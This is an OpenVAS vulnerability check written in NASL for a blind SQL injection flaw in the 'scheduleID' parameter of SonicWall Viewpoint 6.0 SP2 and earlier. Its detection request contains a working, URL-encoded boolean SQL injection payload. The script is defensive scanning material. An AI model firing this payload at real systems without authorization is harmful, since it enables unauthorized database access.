###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sonicwall_viewpoint_scheduleid_sql_inj_vuln.nasl 11861 2018-10-12 09:29:59Z cfischer $
#
# SonicWall Viewpoint 'scheduleID' Parameter SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803033");
  script_version("$Revision: 11861 $");
  script_cve_id("CVE-2011-5169");
  script_bugtraq_id(49906);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 11:29:59 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-09-25 15:47:29 +0530 (Tue, 25 Sep 2012)");
  script_name("SonicWall Viewpoint 'scheduleID' Parameter SQL Injection Vulnerability");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"SonicWALL Viewpoint 6.0 SP2 and prior versions");
  script_tag(name:"insight", value:"Input passed to 'scheduleID' parameter in
  'sgms/reports/scheduledreports/configure/scheduleProps.jsp' page is not
  properly verified before being used in SQL queries.");
  script_tag(name:"solution", value:"Apply SonicWALL Viewpoint hotfix 104767 from the referenced advisory.");
  script_tag(name:"summary", value:"This host is running SonicWall Viewpoint and is prone to sql
  injection vulnerability.");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46115");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2011/Oct/5");
  script_xref(name:"URL", value:"http://www.sonicwall.com/app/projects/file_downloader/document_lib.php?t=RN&id=379");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/105493/SonicWall-Viewpoint-6.0-SP2-Blind-SQL-Injection.html");
  script_xref(name:"URL", value:"https://www.mysonicwall.com/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

sndReq = http_get(item:"/sgms/login", port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

if(rcvRes && rcvRes =~ "HTTP/1.. 200" &&
   (">SonicWALL ViewPoint Login" >< rcvRes ||
    ">SonicWALL GMS Login" >< rcvRes))
{
  url = "/sgms/reports/scheduledreports/configure/scheduleProps.jsp?" +
        "scheduleID=3%20order%20by%201,%20(%20select%20case%20when%20" +
        "(1=1)%20%20then%201%20else%201*(select%20table_name%20from%" +
        "20information_schema.tables)end)=1";

  if(http_vuln_check(port:port, url:url, check_header: TRUE,
     pattern:"List of Reports",
     extra_check: make_list('Schedule Properties', '>Close<', 'EMPTY_HEADER')))
  {
    security_message(port:port);
    exit(0);
  }
}
